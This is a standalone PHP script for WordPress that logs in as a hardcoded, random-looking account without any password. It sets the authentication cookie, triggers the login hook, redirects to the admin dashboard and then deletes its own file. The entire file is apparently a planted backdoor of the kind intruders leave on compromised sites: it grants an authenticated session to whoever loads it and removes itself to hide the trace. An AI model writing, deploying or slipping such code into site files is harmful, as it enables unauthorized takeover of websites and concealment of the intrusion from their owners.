<?php
require_once('wp-load.php');
$loginusername = 'guyucisayo8788';
$user = get_user_by( 'login', $loginusername );
$user_id = $user->ID;
wp_set_current_user( $user_id, $loginusername );
wp_set_auth_cookie( $user_id );
do_action( 'wp_login', $loginusername, $user );
wp_redirect( admin_url() );
unlink(__FILE__); 
?>
